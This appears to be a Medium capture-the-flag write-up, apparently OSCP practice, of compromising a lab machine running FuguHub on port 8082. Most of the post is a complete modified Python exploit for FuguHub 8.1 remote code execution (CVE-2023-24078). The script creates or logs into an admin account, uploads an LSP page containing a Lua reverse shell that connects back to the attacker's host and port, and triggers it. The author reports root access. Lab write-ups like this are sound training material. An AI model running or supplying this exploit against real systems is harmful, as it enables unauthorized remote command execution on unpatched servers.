

![](https://miro.medium.com/v2/resize:fit:700/1*g3-aTU-V5KWA4uVlGV2rQg.png)

Nmap reveals that ports 22, 80, 8082, and 9999 are open. Port 8082 is identified as Barracuda Embedded Web Server, which appears to be a web application for a firewall or something else.

Port 80, on the other hand, only presents a forbidden page. I will initiate a dirbuster scan to further explore it.

![](https://miro.medium.com/v2/resize:fit:700/1*LgcYcDzheibtXoi_J1CQpQ.png)

It appears that Port 8082 is hosting a recently set up FuguHub appliance, which means we need to establish our own admin account. Instant admin access lol.

![](https://miro.medium.com/v2/resize:fit:700/1*bw5auOHn_fdGN-npn4SnQA.png)

Now that we have admin access, I conducted a search for a FuguHub exploit and quickly found one at [https://www.exploit-db.com/exploits/51550](https://www.exploit-db.com/exploits/51550). Initially, the script didn’t work, but I decided to examine the code to understand what was wrong. After making some modifications to address hardcoded URLs, I successfully got it to work. Here’s the modified script.

# Exploit Title: FuguHub 8.1 - Remote Code Execution  
# Date: 6/24/2023  
# Exploit Author: redfire359   
# Vendor Homepage: https://fuguhub.com/  
# Software Link: https://fuguhub.com/download.lsp  
# Version: 8.1  
# Tested on: Ubuntu 22.04.1  
# CVE : CVE-2023-24078   
  
import requests  
from bs4 import BeautifulSoup  
import hashlib  
from random import randint  
from urllib3 import encode_multipart_formdata  
from urllib3.exceptions import InsecureRequestWarning  
import argparse  
from colorama import Fore  
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)  
  
#Options for user registration, if no user has been created yet   
username = 'admin'  
password = 'asdasd'  
email = 'admin@admin.com'  
  
parser = argparse.ArgumentParser()  
parser.add_argument("-r","--rhost", help = "Victims ip/url (omit the http://)", required = True)  
parser.add_argument("-rp","--rport", help = "http port [Default 80]")  
parser.add_argument("-l","--lhost", help = "Your IP", required = True)  
parser.add_argument("-p","--lport", help = "Port you have your listener on", required = True)  
args = parser.parse_args()  
  
LHOST = args.lhost  
LPORT = args.lport  
url = args.rhost  
if args.rport != None:  
    port = args.rport  
else:  
    port = 80  
  
def main():  
    checkAccount()  
  
def checkAccount():  
    print(f"{Fore.YELLOW}[*]{Fore.WHITE} Checking for admin user...")  
    s = requests.Session()  
      
    # Go to the set admin page... if page contains "User database already saved" then there are already admin creds and we will try to login with the creds, otherwise we will manually create an account  
    r = s.get(f"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp")   
    soup = BeautifulSoup(r.content, 'html.parser')  
    search = soup.find('h1')  
      
    if r.status_code == 404:  
        print(Fore.RED + "[!]" + Fore.WHITE +" Page not found! Check the following: \n\tTaget IP\n\tTarget Port")  
        exit(0)  
  
    userExists = False  
    userText = 'User database already saved'  
    for i in search:  
        if i.string == userText:  
            userExists = True  
      
    if userExists:  
        print(f"{Fore.GREEN}[+]{Fore.WHITE} An admin user does exist..")  
        login(r,s)  
    else:  
        print("{Fore.GREEN}[+]{Fore.WHITE} No admin user exists yet, creating account with {username}:{password}")  
        createUser(r,s)  
        login(r,s)  
  
def createUser(r,s):  
    data = { email : email ,   
            'user' : username ,   
            'password' : password ,   
            'recoverpassword' : 'on' }  
    r = s.post(f"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp", data = data)  
    print(f"{Fore.GREEN}[+]{Fore.WHITE} User Created!")      
  
def login(r,s):  
    print(f"{Fore.GREEN}[+]{Fore.WHITE} Logging in...")  
  
    data = {'ba_username' : username , 'ba_password' : password}  
    r = s.post(f"http://{url}:8082/rtl/protected/wfslinks.lsp", data = data, verify = False ) # switching to https cause its easier to script lolz    
  
    #Veryify login   
    login_Success_Title = 'Web-File-Server'  
    soup = BeautifulSoup(r.content, 'html.parser')  
    search = soup.find('title')  
      
    for i in search:  
        if i != login_Success_Title:  
            print(f"{Fore.RED}[!]{Fore.WHITE} Error! We got sent back to the login page...")  
            exit(0)  
    print(f"{Fore.GREEN}[+]{Fore.WHITE} Success! Finding a valid file server link...")  
  
    exploit(r,s)  
  
def exploit(r,s):  
    #Find the file server, default is fs  
    r = s.get(f"http://{url}:8082/fs/")  
      
    code = r.status_code  
  
    if code == 404:  
        print(f"{Fore.RED}[!]{Fore.WHITE} File server not found. ")  
        exit(0)  
  
    print(f"{Fore.GREEN}[+]{Fore.WHITE} Code: {code}, found valid file server, uploading rev shell")  
      
    #Change the shell if you want to, when tested I've had the best luck with lua rev shell code so thats what I put as default   
    shell = f'local host, port = "{LHOST}", {LPORT} \nlocal socket = require("socket")\nlocal tcp = socket.tcp() \nlocal io = require("io") tcp:connect(host, port); \n while       true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'  
  
      
    file_content = f'''  
 <h2> Check ur nc listener on the port you put in <h2>  
  
 <?lsp if request:method() == "GET" then ?>  
  <?lsp   
        {shell}    
  ?>  
 <?lsp else ?>  
  Wrong request method, goodBye!   
 <?lsp end ?>  
 '''  
  
    files = {'file': ('rev.lsp', file_content, 'application/octet-stream')}  
    r = s.post(f"http://{url}:8082/fs/", files=files)  
      
    if r.text == 'ok' :  
        print(f"{Fore.GREEN}[+]{Fore.WHITE} Successfully uploaded, calling shell ")  
        r = s.get(f"http://{url}:8082/rev.lsp")  
  
if __name__=='__main__':  
    try:  
        main()  
    except Exception as error:  
        print(error)  
        print(f"\n{Fore.YELLOW}[*]{Fore.WHITE} Good bye!\n\n**All Hail w4rf4ther!")

I ran it. It worked!

![](https://miro.medium.com/v2/resize:fit:700/1*CSjjtiC2cVf-QwProBKmbw.png)

And, we are root lol.

![](https://miro.medium.com/v2/resize:fit:419/1*pDAGHm53Khhk2oFM_VZZtw.png)

However, the shell is somewhat malfunctioning, so I opted to initiate another reverse shell from the server.

![](https://miro.medium.com/v2/resize:fit:634/1*qAuNXyTqDtVO5okq6Zgnbg.png)

proof.txt: 6f031f5f9838facf0e64644045c7dacc

Rooted!

[

Oscp Preparation

](https://medium.com/tag/oscp-preparation?source=post_page-----c825fd915dca---------------oscp_preparation-----------------)

[

![Ardian Danny](https://miro.medium.com/v2/resize:fill:72:72/1*vrVUMWIoCNLaA0EOiUmlLw.jpeg)





](https://medium.com/@ardian.danny?source=post_page-----c825fd915dca--------------------------------)

[

## Written by Ardian Danny

](https://medium.com/@ardian.danny?source=post_page-----c825fd915dca--------------------------------)

[16 Followers](https://medium.com/@ardian.danny/followers?source=post_page-----c825fd915dca--------------------------------)

Penetration Tester, Ethical Hacker, CTF Player, and a Cat Lover. My first account got disabled by Medium, but it won’t stop me from sharing the things I love.

## More from Ardian Danny

[

![HackTheBox — Authority Writeup](https://miro.medium.com/v2/resize:fit:679/0*JgXNBwQOqgk75muQ.png)

](https://medium.com/@ardian.danny/hackthebox-authority-writeup-d64c34228a5a?source=author_recirc-----c825fd915dca----0---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

![Ardian Danny](https://miro.medium.com/v2/resize:fill:20:20/1*vrVUMWIoCNLaA0EOiUmlLw.jpeg)



](https://medium.com/@ardian.danny?source=author_recirc-----c825fd915dca----0---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

Ardian Danny

](https://medium.com/@ardian.danny?source=author_recirc-----c825fd915dca----0---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

## HackTheBox — Authority Writeup

### This is my write-up on one of the HackTheBox machines called Authority. Let’s go!



](https://medium.com/@ardian.danny/hackthebox-authority-writeup-d64c34228a5a?source=author_recirc-----c825fd915dca----0---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

8 min read·Nov 16, 2023

](https://medium.com/@ardian.danny/hackthebox-authority-writeup-d64c34228a5a?source=author_recirc-----c825fd915dca----0---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[](https://medium.com/@ardian.danny/hackthebox-authority-writeup-d64c34228a5a?responsesOpen=true&sortBy=REVERSE_CHRON&source=author_recirc-----c825fd915dca----0---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

![HackTheBox — Escape Writeup](https://miro.medium.com/v2/resize:fit:679/0*A709B11UmVYiyXxu.png)

](https://medium.com/@ardian.danny/hackthebox-escape-writeup-931dba100509?source=author_recirc-----c825fd915dca----1---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

![Ardian Danny](https://miro.medium.com/v2/resize:fill:20:20/1*vrVUMWIoCNLaA0EOiUmlLw.jpeg)



](https://medium.com/@ardian.danny?source=author_recirc-----c825fd915dca----1---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

Ardian Danny

](https://medium.com/@ardian.danny?source=author_recirc-----c825fd915dca----1---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

## HackTheBox — Escape Writeup

### This is my write-up on one of the HackTheBox machines called Escape. Let’s go!



](https://medium.com/@ardian.danny/hackthebox-escape-writeup-931dba100509?source=author_recirc-----c825fd915dca----1---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

8 min read·Jun 4, 2023

](https://medium.com/@ardian.danny/hackthebox-escape-writeup-931dba100509?source=author_recirc-----c825fd915dca----1---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[](https://medium.com/@ardian.danny/hackthebox-escape-writeup-931dba100509?responsesOpen=true&sortBy=REVERSE_CHRON&source=author_recirc-----c825fd915dca----1---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

1

](https://medium.com/@ardian.danny/hackthebox-escape-writeup-931dba100509?responsesOpen=true&sortBy=REVERSE_CHRON&source=author_recirc-----c825fd915dca----1---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

![Tryhackme — Gatekeeper](https://miro.medium.com/v2/resize:fit:679/0*J1tCY3ma4uyE01mx.jpeg)

](https://medium.com/@ardian.danny/tryhackme-gatekeeper-6edbe14b363c?source=author_recirc-----c825fd915dca----2---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

![Ardian Danny](https://miro.medium.com/v2/resize:fill:20:20/1*vrVUMWIoCNLaA0EOiUmlLw.jpeg)



](https://medium.com/@ardian.danny?source=author_recirc-----c825fd915dca----2---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

Ardian Danny

](https://medium.com/@ardian.danny?source=author_recirc-----c825fd915dca----2---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

## Tryhackme — Gatekeeper

### This is my take on one of the TryHackMe machines called Gatekeeper. Let’s Go!



](https://medium.com/@ardian.danny/tryhackme-gatekeeper-6edbe14b363c?source=author_recirc-----c825fd915dca----2---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

6 min read·Jul 12, 2023

](https://medium.com/@ardian.danny/tryhackme-gatekeeper-6edbe14b363c?source=author_recirc-----c825fd915dca----2---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[](https://medium.com/@ardian.danny/tryhackme-gatekeeper-6edbe14b363c?responsesOpen=true&sortBy=REVERSE_CHRON&source=author_recirc-----c825fd915dca----2---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

![[OSCP Practice Series 3] Proving Grounds — Wheels](https://miro.medium.com/v2/resize:fit:679/1*CFSCpdO0mluX9nciH_nG1A.png)

](https://medium.com/@ardian.danny/oscp-practice-series-3-proving-grounds-wheels-2afd23a1fb65?source=author_recirc-----c825fd915dca----3---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

![Ardian Danny](https://miro.medium.com/v2/resize:fill:20:20/1*vrVUMWIoCNLaA0EOiUmlLw.jpeg)



](https://medium.com/@ardian.danny?source=author_recirc-----c825fd915dca----3---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

Ardian Danny

](https://medium.com/@ardian.danny?source=author_recirc-----c825fd915dca----3---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

## [OSCP Practice Series 3] Proving Grounds — Wheels

### Machine Type: Linux



](https://medium.com/@ardian.danny/oscp-practice-series-3-proving-grounds-wheels-2afd23a1fb65?source=author_recirc-----c825fd915dca----3---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

4 min read·Dec 25, 2023

](https://medium.com/@ardian.danny/oscp-practice-series-3-proving-grounds-wheels-2afd23a1fb65?source=author_recirc-----c825fd915dca----3---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[](https://medium.com/@ardian.danny/oscp-practice-series-3-proving-grounds-wheels-2afd23a1fb65?responsesOpen=true&sortBy=REVERSE_CHRON&source=author_recirc-----c825fd915dca----3---------------------9c0698da_f2f4_43ff_9913_b18610ffe3df-------)

[

See all from Ardian Danny

](https://medium.com/@ardian.danny?source=post_page-----c825fd915dca--------------------------------)

## Recommended from Medium

[

![How I Passed OSCP 2023 in Just 8 Hours with 110 Points Without Using Metasploit](https://miro.medium.com/v2/resize:fit:679/1*uXgTVbz0UGT3ysDGiP4c3w.png)

](https://medium.com/@singh_manish/how-i-passed-oscp-2023-in-just-8-hours-with-110-points-without-using-metasploit-a1c1f464645b?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![Manish Singh](https://miro.medium.com/v2/resize:fill:20:20/1*KrkRrXenYy1vfjSPfyKoGQ.png)



](https://medium.com/@singh_manish?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

Manish Singh

](https://medium.com/@singh_manish?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

## How I Passed OSCP 2023 in Just 8 Hours with 110 Points Without Using Metasploit

### Hey everyone, If you’ve ever been curious about how to pass OffSec Certified Professional (OSCP) exam and get certified so this blog is for…



](https://medium.com/@singh_manish/how-i-passed-oscp-2023-in-just-8-hours-with-110-points-without-using-metasploit-a1c1f464645b?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

10 min read·Aug 17, 2023

](https://medium.com/@singh_manish/how-i-passed-oscp-2023-in-just-8-hours-with-110-points-without-using-metasploit-a1c1f464645b?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[](https://medium.com/@singh_manish/how-i-passed-oscp-2023-in-just-8-hours-with-110-points-without-using-metasploit-a1c1f464645b?responsesOpen=true&sortBy=REVERSE_CHRON&source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

6

](https://medium.com/@singh_manish/how-i-passed-oscp-2023-in-just-8-hours-with-110-points-without-using-metasploit-a1c1f464645b?responsesOpen=true&sortBy=REVERSE_CHRON&source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![[OSCP Practice Series 9] Proving Grounds — Wombo](https://miro.medium.com/v2/resize:fit:679/1*7k_P7CwMCta7iHTqNqRaKg.png)

](https://medium.com/@ardian.danny/oscp-practice-series-9-proving-grounds-wombo-facdbcf2ef18?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![Ardian Danny](https://miro.medium.com/v2/resize:fill:20:20/1*vrVUMWIoCNLaA0EOiUmlLw.jpeg)



](https://medium.com/@ardian.danny?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

Ardian Danny

](https://medium.com/@ardian.danny?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

## [OSCP Practice Series 9] Proving Grounds — Wombo

### Machine Type: Linux



](https://medium.com/@ardian.danny/oscp-practice-series-9-proving-grounds-wombo-facdbcf2ef18?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

3 min read·4 days ago

](https://medium.com/@ardian.danny/oscp-practice-series-9-proving-grounds-wombo-facdbcf2ef18?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[](https://medium.com/@ardian.danny/oscp-practice-series-9-proving-grounds-wombo-facdbcf2ef18?responsesOpen=true&sortBy=REVERSE_CHRON&source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

## Lists

[

![](https://miro.medium.com/v2/resize:fill:48:48/1*uhOhPNE1q5-AJ8fVs6_CBg.jpeg)

![](https://miro.medium.com/v2/resize:fill:48:48/1*iC_bsufbnV9p1p6dCeevZQ.jpeg)

## Staff Picks

546 stories·594 saves



](https://medium.com/@MediumStaff/list/staff-picks-c7bc6e1ee00f?source=read_next_recirc-----c825fd915dca--------------------------------)

[

![](https://miro.medium.com/v2/resize:fill:48:48/1*4zC5ohNcmVDb1NXmzCvmNA.jpeg)

![](https://miro.medium.com/v2/resize:fill:48:48/1*0dul7hn9LeV7U2XLVPvYYw.jpeg)

![](https://miro.medium.com/v2/resize:fill:48:48/1*oO7uwYs0NMWV7B4mUCuoIw.png)

## Stories to Help You Level-Up at Work

19 stories·393 saves



](https://medium.com/@MediumStaff/list/stories-to-help-you-levelup-at-work-faca18b0622f?source=read_next_recirc-----c825fd915dca--------------------------------)

[

![](https://miro.medium.com/v2/resize:fill:48:48/1*VQhBEVqZRXlxFvFVqyTYVA.jpeg)

![](https://miro.medium.com/v2/resize:fill:48:48/1*XRekBY0_j_KEo2_lK_SrkQ.jpeg)

![](https://miro.medium.com/v2/resize:fill:48:48/1*c2stHqktjG8_XTqkC-bkfw.jpeg)

## Self-Improvement 101

20 stories·1136 saves



](https://medium.com/@MediumForTeams/list/selfimprovement-101-3c62b6cb0526?source=read_next_recirc-----c825fd915dca--------------------------------)

[

![](https://miro.medium.com/v2/resize:fill:48:48/1*HWxGot_WiEOZ0fkB_ee2gg.jpeg)

![](https://miro.medium.com/v2/resize:fill:48:48/1*kAzwx9sMsEYm0bMYDTa-lQ.jpeg)

![](https://miro.medium.com/v2/resize:fill:48:48/1*GGLm6Juo_CxQAKEM-mAWfw.jpeg)

## Productivity 101

20 stories·1035 saves



](https://medium.com/@MediumForTeams/list/productivity-101-f09f1aaf38cd?source=read_next_recirc-----c825fd915dca--------------------------------)

[

![My OSCP Journey 2023](https://miro.medium.com/v2/resize:fit:679/0*DoCC0oGuRY_CPh3S.png)

](https://medium.com/@barath.ravan/my-oscp-journey-2023-80dec098b3b?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![Barath](https://miro.medium.com/v2/resize:fill:20:20/1*asqpazBY4hGnzRNKUnQewA.jpeg)



](https://medium.com/@barath.ravan?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

Barath

](https://medium.com/@barath.ravan?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

## My OSCP Journey 2023

### Hello world,



](https://medium.com/@barath.ravan/my-oscp-journey-2023-80dec098b3b?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

7 min read·Jul 22, 2023

](https://medium.com/@barath.ravan/my-oscp-journey-2023-80dec098b3b?source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[](https://medium.com/@barath.ravan/my-oscp-journey-2023-80dec098b3b?responsesOpen=true&sortBy=REVERSE_CHRON&source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

1

](https://medium.com/@barath.ravan/my-oscp-journey-2023-80dec098b3b?responsesOpen=true&sortBy=REVERSE_CHRON&source=read_next_recirc-----c825fd915dca----0---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![Codo — Offsec Proving grounds Walkthrough](https://miro.medium.com/v2/resize:fit:679/1*57dKmJLa2YFRJAsqFlAP-A.jpeg)

](https://medium.com/@jserna4510/codo-offsec-proving-grounds-walkthrough-92a7dd5aa119?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![Jose Serna](https://miro.medium.com/v2/resize:fill:20:20/0*YPm3YGMO6yrxPsXE)



](https://medium.com/@jserna4510?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

Jose Serna

](https://medium.com/@jserna4510?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

## Codo — Offsec Proving grounds Walkthrough

### All the training and effort is slowly starting to payoff. Each box tackled is beginning to become much easier to get “pwned”. While this…



](https://medium.com/@jserna4510/codo-offsec-proving-grounds-walkthrough-92a7dd5aa119?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

4 min read·Jul 23, 2023

](https://medium.com/@jserna4510/codo-offsec-proving-grounds-walkthrough-92a7dd5aa119?source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[](https://medium.com/@jserna4510/codo-offsec-proving-grounds-walkthrough-92a7dd5aa119?responsesOpen=true&sortBy=REVERSE_CHRON&source=read_next_recirc-----c825fd915dca----1---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![[ Pandora ] HTB Manual Walkthrough 2023 | OSCP Prep](https://miro.medium.com/v2/resize:fit:679/1*5jojjU1ZszvvcTdLpp-asw.png)

](https://medium.com/@toneemarqus/pandora-htb-manual-walkthrough-2023-oscp-prep-7a99ccecab8e?source=read_next_recirc-----c825fd915dca----2---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![Tonee Marqus](https://miro.medium.com/v2/resize:fill:20:20/1*uFfV9W6ST3vFAubGMvyVlQ.jpeg)



](https://medium.com/@toneemarqus?source=read_next_recirc-----c825fd915dca----2---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

Tonee Marqus

](https://medium.com/@toneemarqus?source=read_next_recirc-----c825fd915dca----2---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

## [ Pandora ] HTB Manual Walkthrough 2023 | OSCP Prep

### Hi everyone!



](https://medium.com/@toneemarqus/pandora-htb-manual-walkthrough-2023-oscp-prep-7a99ccecab8e?source=read_next_recirc-----c825fd915dca----2---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

5 min read·Sep 2, 2023

](https://medium.com/@toneemarqus/pandora-htb-manual-walkthrough-2023-oscp-prep-7a99ccecab8e?source=read_next_recirc-----c825fd915dca----2---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[](https://medium.com/@toneemarqus/pandora-htb-manual-walkthrough-2023-oscp-prep-7a99ccecab8e?responsesOpen=true&sortBy=REVERSE_CHRON&source=read_next_recirc-----c825fd915dca----2---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![PEN-300 and Offsec Experienced Penetration Tester (OSEP) Certification Review 2023](https://miro.medium.com/v2/resize:fit:679/0*qgGnHlJ_REKEfItq.png)

](https://medium.com/@maland/pen-300-and-offsec-experienced-penetration-tester-osep-certification-review-2023-d9ee3cf37f43?source=read_next_recirc-----c825fd915dca----3---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

![Edo Maland](https://miro.medium.com/v2/resize:fill:20:20/1*kowuBtuvjvWjwd69TEFfzg.jpeg)



](https://medium.com/@maland?source=read_next_recirc-----c825fd915dca----3---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

Edo Maland

](https://medium.com/@maland?source=read_next_recirc-----c825fd915dca----3---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

## PEN-300 and Offsec Experienced Penetration Tester (OSEP) Certification Review 2023

### Background



](https://medium.com/@maland/pen-300-and-offsec-experienced-penetration-tester-osep-certification-review-2023-d9ee3cf37f43?source=read_next_recirc-----c825fd915dca----3---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

10 min read·Oct 21, 2023

](https://medium.com/@maland/pen-300-and-offsec-experienced-penetration-tester-osep-certification-review-2023-d9ee3cf37f43?source=read_next_recirc-----c825fd915dca----3---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[](https://medium.com/@maland/pen-300-and-offsec-experienced-penetration-tester-osep-certification-review-2023-d9ee3cf37f43?responsesOpen=true&sortBy=REVERSE_CHRON&source=read_next_recirc-----c825fd915dca----3---------------------a43a4609_c5c6_422f_b7ad_a1bf07127cb6-------)

[

See more recommendations

](https://medium.com/?source=post_page-----c825fd915dca--------------------------------)

[

Help

](https://help.medium.com/hc/en-us?source=post_page-----c825fd915dca--------------------------------)

[

Status

](https://medium.statuspage.io/?source=post_page-----c825fd915dca--------------------------------)

[

About

](https://medium.com/about?autoplay=1&source=post_page-----c825fd915dca--------------------------------)

[

Careers

](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----c825fd915dca--------------------------------)

[

Blog

](https://blog.medium.com/?source=post_page-----c825fd915dca--------------------------------)

[

Privacy

](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----c825fd915dca--------------------------------)

[

Terms

](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----c825fd915dca--------------------------------)

[

Text to speech

](https://speechify.com/medium?source=post_page-----c825fd915dca--------------------------------)

[

Teams

](https://medium.com/business?source=post_page-----c825fd915dca--------------------------------)